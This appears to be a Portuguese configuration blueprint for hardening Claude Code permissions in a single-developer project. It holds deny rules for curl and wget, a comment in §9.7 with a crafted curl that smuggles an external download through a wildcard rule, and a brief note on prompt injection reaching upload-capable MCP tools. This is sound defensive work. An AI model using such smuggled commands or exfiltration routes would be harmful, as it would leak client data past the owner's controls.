| **Hook `SessionStart` para `nvm use`** | **Não adotar** | **Não funciona**: o hook roda em processo próprio e o shell da ferramenta Bash reinicia a cada chamada; o `PATH` não atravessa. Registrado para não ser reinventado |
| **Hook `ConfigChange`** | **Adiar** (G6) | Zero evidência de rotatividade — `settings.json` sem alteração desde 03/08/2026 15:45. Controle de mudança sobre arquivo que nunca mudou é cargo cult |
| **`.claude/rules/` com `paths:`** | **Não adotar** | Regras com `paths:` **não são reinjetadas após compactação**; o `CLAUDE.md` da raiz é. Adotar seria trocar mecanismo persistente por frágil. Além disso o invariante deste projeto já cabe em um arquivo |
| **`CLAUDE.md` aninhado em `src/domain/`** | **Não adotar** | Mesmo motivo, **e** a fronteira já é **imposta pelo Biome**. Instrução onde já há imposição é custo sem ganho |
| **Skill `novo-indicador` / `nova-pagina` agora** | **Adiar** | Gatilhos escritos pelo próprio projeto. `novo-indicador`: 3 de 5 repetições, e `H-11` **já divergiu** do ciclo. Congelar formato instável é o modo de falha das skills |
| **Subagents para paralelizar o backlog** | **Nunca** | Caminho crítico é cadeia **sequencial** de 18 sessões. Fan-out não encurta cadeia sequencial. **A premissa da MP-9 falha de forma verificável** |
| **Agent teams** | **Não adotar** | Mesma premissa que falha, custo de token maior, e experimental/desabilitado por padrão |
| **Servidor MCP de projeto (`.mcp.json`)** | **Não adotar** | Aplicação local sem integração externa por definição (ADR-0002). Acrescentar servidor amplia superfície com dado de cliente em disco, sem tarefa recorrente atrás |
| **Plugins, marketplaces, configuração gerenciada** | **Não adotar** | Máquina única, um desenvolvedor. As chaves de contenção (`strictKnownMarketplaces`, `allowManagedPermissionRulesOnly`) só são lidas de configuração **gerenciada**, que exige `/etc/claude-code/` e administrador. É "não é configurável neste contexto", não "está mal configurado" |
| **Dev container** | **Não adotar** | A aplicação depende de arquivo em pasta sincronizada do OneDrive no host. Um container obrigaria a montar justamente o artefato mais sensível, ou a quebrar `H-30` |
| **`autoMemoryEnabled: false`** | **Não adotar** | A memória automática é **reinjetada do disco após compactação** — é um dos poucos lugares persistentes que existem, e grava **fora** do repositório. Numa cadeia de 18 sessões tem valor. A instrução da peça 4 cobre o risco de um aprendizado capturar nome de cliente |
| **`defaultMode` ≠ `default`** | **Não adotar** | `acceptEdits` alcança `mv`/`cp` sobre a planilha real; `auto`/`dontAsk`/`bypassPermissions` mudam o regime inteiro num projeto sem git. As regras `Edit` de escopo estreito da Onda 1 entregam o ganho relevante |
| **AGENTS.md como fonte compartilhada** | **Não entra no relatório** | Todas as fontes localizadas são **T4**. Sem fonte T1–T3, a prática não pode ser apresentada. Registro separadamente que a premissa também falharia: uma ferramenta, um desenvolvedor |
| **Ampliar permissão sobre `git`, `npm install`/`ci` ou o perfilador** | **Proibido** | Versionamento, instalação de dependência e dado sensível. A recomendação é o movimento **contrário**: em `H-01`/virada de ano, **o diálogo de permissão é o controle** |

> **SUPERADO EM 31/08/2026 — `.claude/rules/` foi adotado.** A linha acima
> recomendava não adotar, e o argumento central — regra com `paths:` não
> sobrevive à compactação — **é falso, e a documentação oficial o desmente**:
> rules com `paths:` recarregam quando o Claude volta a ler arquivo que casa o
> glob, e o hook `InstructionsLoaded` expõe `load_reason: compact`. A
> recomendação de 04/08/2026 foi construída sobre uma premissa errada. O outro
> lado
> da conta também mudou: o `CLAUDE.md` chegou a 6400 palavras carregadas em **toda** sessão,
> e três assuntos dele só interessam a quem abre arquivos específicos. Hoje há
> cinco rules, e elas valem ~1750 palavras que deixaram de ser carregadas
> sempre. **A fragilidade foi aceita conscientemente, não esquecida:** rule é
> contexto e não configuração aplicada, e quem garante continua sendo a asserção
> em `tests/repo/`, que cobra uma menção no `CLAUDE.md` para cada peça de
> `.claude/`. Regra inviolável não migrou.


---

## 9. Anexo — artefatos prontos para colar

> **Nada aqui foi aplicado.** Nenhum arquivo de configuração foi criado, editado
> ou removido. Cada bloco traz o caminho de destino.

### 9.1 `.claude/settings.json` — Onda 0, arquivo completo

**Destino:** `.claude/settings.json` · **substitui integralmente o atual.**

Este arquivo é a **consolidação** de `docs/auditoria-configuracao-claude.md`
§8.1 com `Bash(nvm use)` de `docs/delegacao-configuracao-claude.md` §8.1.
Consolidar é necessário, não estético: aplicar duas propostas parciais ao mesmo
arquivo **sem git** é o cenário em que se perde uma entrada no caminho.

```json
{
  "$schema": "https://json.schemastore.org/claude-code-settings.json",
  "permissions": {
    "disableBypassPermissionsMode": "disable",

    "deny": [
      "Read(/*.xlsx)",
      "Edit(/*.xlsx)",
      "Read(/*.jpeg)",
      "Edit(/*.jpeg)",
      "Read(/config/app.json)",
      "Edit(/config/app.json)",
      "Read(/data/**)",
      "Edit(/data/**)",
      "Bash(git add -f *)",
      "Bash(git add --force *)",
      "Bash(git push *)",
      "Bash(curl *)",
      "Bash(wget *)"
    ],

    "ask": [
      "Bash(git add *)",
      "Bash(npm install)",
      "Bash(npm ci)"
    ],

    "allow": [
      "Bash(nvm use)",
      "Bash(npm run verify)",
      "Bash(npm test)",
      "Bash(npm test -- *)",
      "Bash(npm run lint)",
      "Bash(npm run typecheck)",
      "Bash(npm run build)",
      "Bash(npm run dev)",
      "Bash(npx vitest run *)",
      "Bash(npx tsc --noEmit)",
      "Bash(node --version)",
      "Bash(unzip -l *)"
    ]
  },

  "hooks": {
    "PreToolUse": [
      {
        "matcher": "Bash",
        "hooks": [
          {
            "type": "command",
            "command": "${CLAUDE_PROJECT_DIR}/.claude/hooks/guard-dados-sensiveis.sh",
            "statusMessage": "Verificando comando contra artefatos sensíveis...",
            "timeout": 15
          }
        ]
      }
    ]
  }
}
```

**Notas de leitura, para não haver surpresa ao aplicar:**

- **`deny` de `*.xlsx` não bloqueia as fixtures.** `/*.xlsx` ancora na raiz do
  projeto e, em semântica gitignore, `*` não cruza `/`. `tests/fixtures/*.xlsx`
  segue acessível — deliberado.
- **`deny` de `*.xlsx` não bloqueia a aplicação.** `npm run dev` lê o workbook
  via ExcelJS, que é subprocesso e está fora do alcance de regras `Read`. É o
  comportamento desejado — e é a fronteira que só o sandbox fecharia.
- **`Bash(curl *)` e `Bash(wget *)` em `deny`** fecham o canal de saída de rede
  por shell. `WebFetch` continua disponível e é o canal correto. **Ver a
  consequência em D-3:** o incremento de `curl` da Onda 1 precisa de uma regra
  `allow` de casamento exato, e `deny` vence `allow` — as três rotas de loopback
  exigem, portanto, **remover `Bash(curl *)` do `deny` e substituí-lo por
  `deny` mais estreito**, ou aceitar que a conferência siga manual. **Esta
  interação entre as duas propostas anteriores não estava registrada em nenhuma
  das duas** e é a razão prática de este anexo existir.
- **Removida** `Read(//home/usuario/...**)`: redundante — leitura no
  diretório de trabalho já não pede aprovação — e é ela que vaza o caminho da
  máquina no arquivo que irá para o GitHub.
- **`Bash(nvm use)` é casamento exato**, sem curinga, deliberadamente.

### 9.2 `.claude/hooks/guard-dados-sensiveis.sh`

**Destino:** `.claude/hooks/guard-dados-sensiveis.sh` · exige `chmod +x` ·
depende de `jq`.

**O script completo está em `docs/auditoria-configuracao-claude.md` §8.2, e
não é reproduzido aqui.** A decisão é deliberada e é de engenharia: manter duas
cópias de um controle de segurança em dois documentos do mesmo repositório cria
divergência silenciosa — a próxima correção entra em uma cópia e não na outra.
O que este blueprint acrescenta ao artefato de lá:

- **Deve falhar fechado** (`exit 2`), ao contrário do padrão fail-open da T3
  (AWS). Justificativa em §5, MP-3.
- **`exit 1` não bloqueia** — é erro não-bloqueante e a ação prossegue. Só
  `exit 2` interrompe. Conferir isto ao aplicar.
- Regras que o script precisa cobrir, na ordem: `git add` com `-f`/`--force` ou
  em massa · redirecionamento (`>`/`>>`) para `config/`, `data/`, `*.xlsx`,
  `*.jpeg`, `docs/perfilamento` · `git diff --output=` · remoção recursiva em
  diretório versionável · perfilador com destino **dentro** do repositório.

### 9.3 `.gitignore` — acréscimo

**Destino:** `.gitignore`. Duas linhas ao fim do arquivo de 16 linhas
**existente**. Nada é removido.

```gitignore

# Configuracao local do Claude Code — escolhas de maquina, nao da equipe
.claude/settings.local.json
```

`.claude/settings.json` **deve** ser versionado: depois de trocar os caminhos
absolutos por âncora de projeto ele não contém nada específico de máquina, e é
justamente a política de permissão que precisa viajar com o projeto para a
máquina do operador em `H-30`.

### 9.4 `CLAUDE.md` — change-set da Onda 0

**Destino:** `CLAUDE.md`. Três acréscimos e uma correção. **Nenhuma reescrita.**

**(i) Correção do bloco `## Comandos`** — mantém a linha do `nvm use`, que é
correta, e acrescenta o fato que faltava (PR-01):

````markdown
```bash
nvm use             # Node 22.23.2, conforme .nvmrc
npm run verify      # lint + typecheck + test + build — portão obrigatório
npm test            # Vitest
npm run dev         # servidor + interface
```

O shell do agente **reinicia a cada chamada de ferramenta** e carrega Node
**v20.19.5**, abaixo de `engines` (`>=22.12.0 <23`). Prefixe `nvm use &&` em
**todo** comando que execute Node — sem isso, `npm run dev` e `npm start`
falham com `node: bad option: --experimental-strip-types`, que não se parece
com erro de ambiente. Medido em 04/08/2026.

O perfilador **não** é comando de rotina. Só na virada de ano, sob a regra 11.
````

**(ii) Três regras invioláveis novas, após a atual 10:**

```markdown
11. **Este repositório será publicado.** Nenhum arquivo novo em `docs/` pode
    conter valor de célula da planilha real. `tools/profile_workbook.py` emite
    até 15 amostras por coluna de **todas** as abas, inclusive `CNPJ` — grave a
    saída em `/tmp`, sanitize as colunas identificáveis, e só então mova para
    `docs/perfilamento/`.
12. **`CONTROLE DOS EMBARQUE.xlsx`, `planilha1.jpeg` e `planilha2.jpeg` não são
    para o agente.** Contêm dado de cliente e, na aba `CNPJ`, credenciais.
    `.claude/settings.json` nega leitura e escrita nos três — não é mais só
    disciplina.
13. **Prefira `Edit` a `Write`; nunca sobrescreva arquivo que você não leu.**
    O checkpoint de sessão alcança as ferramentas de edição, **não** alcança
    escrita por comando Bash nem por subprocesso.
```

> Se a decisão **D-1** for aplicar a peça 1, a regra 13 perde a primeira
> justificativa (passa a haver `git revert`) mas **mantém a segunda** — o
> checkpoint continua sem alcançar subprocesso. Manter o texto como está.

### 9.5 `.claude/skills/fatia/SKILL.md`

**Destino:** `.claude/skills/fatia/SKILL.md` — o nome do comando vem do nome do
**diretório**: `/fatia`.
**Condição inseparável:** remover do `CLAUDE.md` as 25 linhas do bloco
` ```markdown … ``` ` do protocolo de fatia, mantendo lá o cabeçalho da seção, a
frase de gatilho e as 5 regras do protocolo, e acrescentando à regra 1 a menção
a `/fatia`.

Campos obrigatórios segundo `/docs/pt/skills` (04/08/2026): **nenhum campo de
frontmatter é obrigatório**; `description` é *recomendada* e é o que faz o Claude
carregar a skill sozinho.

````markdown
---
name: fatia
description: Abre uma história do backlog do CronosComex montando o checklist do protocolo de fatia, com o contrato fixado, os critérios de aceite e os casos-limite obrigatórios já embutidos. Use ao iniciar qualquer história H-NN, antes de escrever a primeira linha de código.
when_to_use: Quando o usuário disser "vamos para a H-12", "iniciar H-13", "próxima história" ou invocar /fatia H-NN.
argument-hint: [H-NN]
---

## A história, direto do backlog

!`grep -m1 -A 95 "^### $ARGUMENTS " docs/06-backlog.md`

## Casos-limite obrigatórios atribuídos a esta história

Extraídos de `docs/08-qualidade-operacao.md` §1.3 — os 43 casos obrigatórios.
Cada linha abaixo precisa virar um teste com o **valor concreto** que aparece
nela.

!`grep -F "| $ARGUMENTS |" docs/08-qualidade-operacao.md`

## Linhas da matriz de rastreabilidade que citam esta história

!`grep -F "$ARGUMENTS" docs/09-rastreabilidade.md`

## O que fazer agora

Monte o checklist abaixo e **aguarde**. Não escreva código antes da resposta.
Todos os itens vêm do material acima, copiados — não inventados. O que não
estiver lá é divergência, e divergência **para** a implementação.

```markdown
## H-NN — <título>

**Objetivo:** <a frase do backlog>
**Tamanho:** P/M/G · **Depende de:** H-XX ✅ · **Fase:** N

### Contrato (já fixado — não redefinir)
<assinatura, rota ou schema, copiado do backlog>

### A fazer
- [ ] `caminho/do/arquivo.ts` — o que muda
- [ ] `caminho/do/teste.test.ts` — o que cobre

### Critérios de aceite
- [ ] Dado ... Quando ... Então ...

### Casos-limite a cobrir com teste
- [ ] `<valor concreto>` → `<resultado esperado>`

### Fora desta fatia
- <o que NÃO fazer aqui, e em qual história vai>

### Divergências encontradas no plano
- <nenhuma | descrição + o que proponho>
```

### Regras que valem durante toda a fatia

- Use `TodoWrite` em paralelo, para acompanhamento.
- Todo comando que execute Node vai prefixado por `nvm use &&` — o shell
  reinicia a cada chamada e carrega uma versão abaixo de `engines`.
- Ao terminar, invoque `/fechar-historia H-NN`.
````

**Se o bloco "A história" vier vazio:** `$ARGUMENTS` não foi substituído antes
da execução do comando de contexto dinâmico (ordem não confirmada na
documentação — §10). Plano B: trocar as três linhas `` !` `` por
`` !`grep -n "^### H-" docs/06-backlog.md` `` e ler o intervalo com `Read`.
Perde-se a sobrevivência à compactação; o resto continua valendo.

### 9.6 `.claude/skills/fechar-historia/SKILL.md`

**Destino:** `.claude/skills/fechar-historia/SKILL.md` → `/fechar-historia`.

````markdown
---
name: fechar-historia
description: Fecha uma história do CronosComex (H-NN) — roda o portão de qualidade, percorre a definition of done, atualiza backlog, rastreabilidade e o bloco Estado do CLAUDE.md, e imprime a prova de que os três ficaram consistentes. Use quando a implementação de uma história terminar.
when_to_use: Quando o usuário disser "fechar H-12", "história concluída", "marque como pronta" ou invocar /fechar-historia H-NN.
argument-hint: [H-NN]
---

## Estado atual dos três arquivos, antes de mexer

!`grep -m1 -A 4 "^### $ARGUMENTS " docs/06-backlog.md`
!`grep -F "$ARGUMENTS" docs/09-rastreabilidade.md`
!`grep -n -m1 -A 6 "^## Estado" CLAUDE.md`

## Passos

1. **Portão.** Rode `nvm use && npm run verify`. Sem o `nvm use` o comando roda
   em Node v20.19.5, abaixo de `engines`. Se reprovar, **pare aqui** e conserte
   — não marque nada.
2. **Definition of done** (`docs/10-governanca.md`). Percorra os 8 itens e diga,
   para cada, se passou e **com base em quê**:
   - [ ] O protocolo de fatia foi apresentado e aprovado
   - [ ] Todos os critérios de aceite passam
   - [ ] Todos os casos-limite têm teste com **valor concreto**
   - [ ] `npm run verify` passa
   - [ ] Nenhuma regra de negócio fora de `src/domain/`
   - [ ] Nenhum teste aponta para a planilha real
   - [ ] História marcada em `06-backlog.md`
   - [ ] `09-rastreabilidade.md` conferido, se algum status mudou
3. **Backlog.** Acrescente o bloco `> ✅ **CONCLUÍDA em DD/MM/AAAA.** …` logo
   abaixo do título da história, no mesmo formato dos já existentes: número de
   testes próprios, total da suíte, divergências resolvidas.
4. **Rastreabilidade.** Atualize o `Status` de cada linha de
   `09-rastreabilidade.md` que cite a história.
5. **`CLAUDE.md`, bloco `## Estado`.** **Releia o arquivo do disco antes de
   editar** — a cópia em contexto é o snapshot do início da sessão e pode estar
   defasada. Atualize a fase, a próxima história e o total de testes
   **exatamente como o Vitest reportou**. **Não estime número:** em 04/08/2026 o
   bloco dizia 279 e a contagem estática devolvia 273.
6. **Marcos de tooling.** Se esta história for `H-13`, `H-20` ou a última antes
   de `H-24`, avise que o gatilho de tooling foi atingido.

## Prova — imprima isto no final, sem editar

O fechamento só está concluído quando as três saídas abaixo forem consistentes
entre si. É o critério de aceite desta skill: o usuário lê três linhas em vez de
reabrir três documentos.

```bash
grep -m1 -A 2 "^### $ARGUMENTS " docs/06-backlog.md
grep -c "$ARGUMENTS" docs/09-rastreabilidade.md
grep -m1 -A 6 "^## Estado" CLAUDE.md
```

Se a próxima história citada no `CLAUDE.md` não for a sucessora declarada em
`docs/07-plano-entrega.md`, **diga isso em vez de corrigir por conta própria**.
````

### 9.7 Incremento de permissões — Onda 1

**Destino:** `.claude/settings.json`, sobre o arquivo de §9.1.

```jsonc
// Acrescentar a permissions.allow:

// Edicoes por ferramenta sao rastreadas por checkpoint e desfazeis com
// /rewind; escritas por subprocesso nao sao. Ancora "/" resolve para a raiz
// do projeto. Fora: raiz, config/, data/, *.xlsx, *.jpeg.
"Edit(/src/**)",
"Edit(/tests/**)",
"Edit(/web/**)",
"Edit(/docs/**)",

// Conferencia contra o arquivo real. Casamento EXATO por rota.
// Substituir 5173 pela porta real de config/app.json (decisao D-3).
// Curinga na porta e PROIBIDO: "curl -s http://127.0.0.1:*/api/indicators"
// casa "curl -s http://127.0.0.1:1 -o src/x.ts http://externo/api/indicators".
// POST /api/reload fica de fora: muta estado.
// ATENCAO: exige remover "Bash(curl *)" do deny de 9.1 — deny vence allow.
"Bash(curl -s http://127.0.0.1:5173/api/health)",
"Bash(curl -s http://127.0.0.1:5173/api/indicators)",
"Bash(curl -s http://127.0.0.1:5173/api/quarantine)"
```

### 9.8 Onda 2 — ponteiros, não conteúdo

Artefatos já escritos, **a criar apenas no gatilho**:
`.claude/agents/revisor-xml.md` → `docs/delegacao-configuracao-claude.md` §8.4.
Bloco `sandbox` em `.claude/settings.local.json` → `docs/auditoria-configuracao-claude.md` §8.3.

---

## 10. Não verificado

| Item | Por quê | O que deixa em aberto |
|---|---|---|
| Conteúdo de `config/app.json` — em particular **a porta real** | **Não inspecionado por política vigente** (`deny Read` em `settings.json:26`). Respeitado por toda via, inclusive shell | Bloqueia as três regras de `curl` da Onda 1. Vira a decisão **D-3** |
| Conteúdo de `data/**` | **Não inspecionado por política vigente** (`settings.json:27`). Nem conteúdo, nem listagem de nomes | Nada deste blueprint depende disso |
| Conteúdo de `CONTROLE DOS EMBARQUE.xlsx`, `planilha1.jpeg`, `planilha2.jpeg` | **Não abertos por decisão.** Nenhuma regra os protege hoje; abri-los seria ingerir exatamente o dado que a peça 2 existe para proteger | A caracterização vem do comentário do `.gitignore` e dos documentos do projeto, não do conteúdo |
| A suíte de testes não foi executada | O build escreve em `dist/` e o teste de log plausivelmente escreve em `data/` — alteraria o estado do repositório | (a) A legibilidade da saída de falha do portão é **inferida** da configuração das três ferramentas. (b) A divergência de **6 casos** (273 estático × 279 declarado, PR-04) fica sem explicação |
| `tools/profile_workbook.py` não foi executado nem lido linha a linha | Executá-lo materializaria o dump que PR-06 descreve | PR-06 repousa em `[obs-2ª]` — medição da auditoria anterior, com números de linha citados |
| Se o casamento Bash trata `>` e `>>` como parte do mesmo comando | A doc lista os separadores reconhecidos e **não** menciona redirecionamento. **Inferência, não afirmação documental** | PR-09 depende disso. **Teste empírico de 30 segundos**, com o `settings.json` atual: pedir `npm test -- --reporter=json > /tmp/x.json`. Se rodar sem prompt, PR-09 está confirmado |
| Se `$ARGUMENTS` é substituído **antes** de o comando `` !`…` `` executar | A página de skills descreve as duas mecânicas separadamente e não declara a ordem | Afeta §9.5. Teste: criar a skill e rodar `/fatia H-12`. Se o bloco vier vazio, aplicar o plano B escrito no artefato |
| Se o "não pergunte novamente" de modificação de arquivo vale por arquivo ou por sessão | A tabela de `/docs/pt/permissions` diz apenas *"até o final da sessão"* | Afeta a magnitude do ganho das regras `Edit` — é por isso que elas estão **fora** do conjunto mínimo |
| Se as regras `allow` de `.claude/settings.json` estão **em vigor hoje** | Dependem do diálogo de confiança do workspace ter sido aceito. Não é observável de dentro da sessão | Se não foram aceitas, **nenhuma** das 19 entradas vale e o custo de autorização está subestimado. **Verificável pelo usuário com `/permissions`** |
| Limites numéricos de reinjeção de skill após compactação (5.000 tokens/skill, 25.000 total) | Afirmados em `docs/delegacao-configuracao-claude.md` §2.1. **Não os reencontrei** na página `context-window` nesta sessão | O que **verifiquei** é a afirmação qualitativa: *"Only skills you actually invoked are preserved"*. É ela que sustenta a peça 5; os números não |
| `claude.com/blog/how-anthropic-teams-use-claude-code` | **Lida apenas por resumo de busca**, não integralmente | Nenhuma recomendação repousa sobre ela |
| Configuração global em `~/.claude` | **Fora de escopo** por definição do enunciado | Duas consequências: (a) conectores MCP de nível de usuário com capacidade de envio e upload estão ativos nesta sessão — negá-los **é** possível no projeto (decisão D-4); (b) `~/.claude/CLAUDE.md` carrega **antes** do `CLAUDE.md` do projeto, e uma contradição entre os dois é resolvida arbitrariamente. Conferível com `/memory`, sem auditar o diretório |
| `tools/build_fixtures.py` | Não executado | A afirmação de que ele sanitiza abas fora de escopo vem da auditoria anterior |

---

## 11. Decisões do usuário

Em ordem de impacto. Cada uma muda o blueprint.

### D-1 — Aplicar a Onda 0 como bloco único, hoje?

- **Recomendado: sim, como bloco indivisível.** `git init` sozinho **piora** o
  estado, porque ativa PR-07: `Bash(git add *)` deixa de ser um comando que
  falha e passa a ser o caminho por onde a planilha real chega ao GitHub. As
  quatro peças são um movimento só.
- **Se aplicar só o `git init`:** ganha-se a rede de segurança e abre-se o
  vetor de publicação. **Pior que o estado atual.**
- **Se aplicar só as peças 2, 3 e 4:** funciona, e as edições em
  `settings.json` e `CLAUDE.md` são feitas sem desfazer. Aceitável, mas é
  trocar dois minutos de `git init` por risco permanente.
- **Consequência de adiar tudo:** o blueprint inteiro fica parado — a Onda 1 não
  entra antes da Onda 0.

### D-2 — O que vai para o GitHub, e o `docs/` vai como está?

O repositório documenta, em mais de um arquivo, que a organização mantém
credenciais de terceiros sem proteção numa planilha sincronizada com o
SharePoint. **Resolvido em 05/08/2026:** contagem, qualificador e nomes dos
sistemas removidos de todos os documentos antes de qualquer publicação.

- **Recomendado: repositório privado**, ou publicar o código e `docs/` **exceto
  `docs/perfilamento/`**, substituindo as seções de alerta de segurança por
  referência interna. O achado continua registrado onde importa e deixa de ser
  um índice público.
- **Consequência para este blueprint:** a regra inviolável 11 da peça 4 assume
  que a publicação vai acontecer. Se a resposta for "repositório privado, sem
  publicação", a regra 11 **continua valendo** — a sanitização do perfilador é
  boa prática independentemente —, mas perde urgência.
- **Se publicar como está:** o conteúdo é permanente. Considere girar as
  credenciais **antes**, não depois.

### D-3 — Qual é a porta real em `config/app.json`, e o que fazer com `curl`?

- Não inspecionei o arquivo: está no `deny`. O `config/app.json.exemplo` traz
  `"port": 5173`.
- **A interação que nenhum dos dois documentos anteriores registrou:** §9.1 põe
  `Bash(curl *)` no `deny`, e `deny` vence `allow`. As três regras de loopback
  da Onda 1 **não funcionarão** sobre aquele arquivo sem uma alteração.
- **Recomendado: manter `Bash(curl *)` no `deny` e deixar a conferência
  manual**, até que a Onda 1 seja realmente necessária. Fechar o canal de saída
  de rede vale mais que economizar ~6 diálogos.
- **Alternativa:** substituir `"Bash(curl *)"` por `deny` mais estreito
  (`"Bash(curl http*)"`, que não casa `127.0.0.1`) e acrescentar as três regras
  exatas. **Mais frágil** — a própria documentação avisa que padrões que
  restringem argumentos de `curl` são frágeis.
- **Nunca:** curinga na posição da porta.

### D-4 — Negar as ferramentas MCP com capacidade de envio e upload neste projeto?

- **Recomendado: sim, no `deny` do projeto.** É a decisão D-3 da auditoria
  anterior e concordo. Depois de `curl`/`wget` negados, os conectores MCP são o
  canal de saída de rede que sobra — e há uma ferramenta capaz de fazer upload
  para o SharePoint na sessão, exatamente onde a planilha real vive.
- **Alternativa mais forte:** `"mcp__*"` inteiro no `deny`. Fecha tudo,
  inclusive leitura de documentação.
- **Se não negar:** o risco só se materializa com injeção de prompt — improvável,
  mas não hipotética num repositório cujos documentos o agente é instruído a ler
  no início de **cada** história.

### D-5 — Aceita mover as 25 linhas do gabarito do `CLAUDE.md` para `/fatia`?

- **Recomendado: sim**, mantendo no `CLAUDE.md` a frase de gatilho e as 5 regras
  do protocolo. O arquivo cai de ~269 para ~244 linhas e o gabarito passa a
  chegar **com a história já embutida** e a sobreviver à compactação.
- **Se preferir não mexer:** a peça 5 cai inteira, e com ela o principal ganho da
  Onda 1. O protocolo continua funcionando — ele já funciona —, só continua
  custando 46 linhas em toda sessão e deixando o contrato exposto.

### D-6 — Confirmar o conteúdo dos caminhos negados

Não inspecionei `config/app.json` nem `data/**`. Duas perguntas:

1. `config/app.json` contém **apenas** caminho, `sheetName`, `port` e limiares?
2. Algum registro em `data/logs/*.jsonl` ou `data/quarantine.json` carrega valor
   de célula, `ref` de cliente ou texto livre?

**Se qualquer resposta for "sim":** os caminhos negados passam a ser tão
sensíveis quanto a planilha, e a leitura **por subprocesso** — que nenhuma regra
alcança — vira prioridade. Isso promoveria o sandbox da Onda 2 para a Onda 1.

### D-7 — O diálogo de confiança do workspace já foi aceito nesta pasta?

- Sem ele, **nenhuma** regra `allow` de `.claude/settings.json` está em vigor, e
  o custo de autorização medido nos três documentos está subestimado.
- **Como verificar:** `/permissions`, conferindo se as entradas aparecem com
  origem `.claude/settings.json`.
- **Recomendado: conferir antes de aplicar a Onda 0** — senão os seis sinais de
  saída da onda não são interpretáveis.
